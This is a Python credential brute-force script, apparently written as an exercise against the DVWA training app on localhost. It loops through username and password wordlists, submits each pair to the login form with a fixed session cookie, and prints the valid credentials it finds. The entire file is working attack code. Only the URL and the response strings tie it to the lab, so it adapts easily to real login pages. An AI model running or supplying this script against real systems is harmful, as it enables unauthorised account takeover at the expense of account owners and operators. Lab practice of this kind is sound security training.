import requests

URL = "http://localhost:4280/vulnerabilities/brute/"

cookies = {
    'PHPSESSID': '7636b25c8442775ac9a50d2bf36175cc',  
    'security': 'medium'
}

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:150.0) Gecko/20100101 Firefox/150.0'
}

def probar_login_get(session, username, password):
    params = {
        'username': username,
        'password': password,
        'Login': 'Login'
    }
    try:
        response = session.get(URL, params=params, cookies=cookies, headers=headers, timeout=5)

        if "Welcome to the password protected area" in response.text:
            return True
        elif "Username and/or password incorrect" in response.text:
            return False
        else:
            print(f"Respuesta indeterminada para {username}:{password} (HTTP {response.status_code})")
            return False

    except requests.exceptions.RequestException as e:
        print(f"Error de conexion con {username}:{password}: {e}")
        return False

def brute_force(users_file, passwords_file, max_pairs=5):
    session = requests.Session()

    with open(users_file) as f:
        usernames = [l.strip() for l in f if l.strip()]
    with open(passwords_file) as f:
        passwords = [l.strip() for l in f if l.strip()]

    print(f"Cargados {len(usernames)} usuarios y {len(passwords)} contraseñas")
    print(f"Total de combinaciones: {len(usernames) * len(passwords)}")

    valid_pairs = []
    intentos = 0

    for username in usernames:
        for password in passwords:
            intentos += 1
            ok = probar_login_get(session, username, password)

            if ok:
                print(f"VALIDO ({intentos} intentos): {username}:{password}")
                valid_pairs.append((username, password))
                if len(valid_pairs) >= max_pairs:
                    print(f"[Se alcanzaron {max_pairs} pares validos, deteniendo funcion.")
                    return valid_pairs
            else:
                print(f"Fallo ({intentos}): {username}:{password}")

    return valid_pairs

if __name__ == "__main__":
    print("Iniciando ataque")
    resultados = brute_force("john.txt", "top-passwords-shortlist.txt", max_pairs=2)

    print("\nRESULTADOS")
    if resultados:
        for user, pwd in resultados:
            print(f"Usuario: {user} | Contraseña: {pwd}")
    else:
        print("No se encontraron credenciales validas.")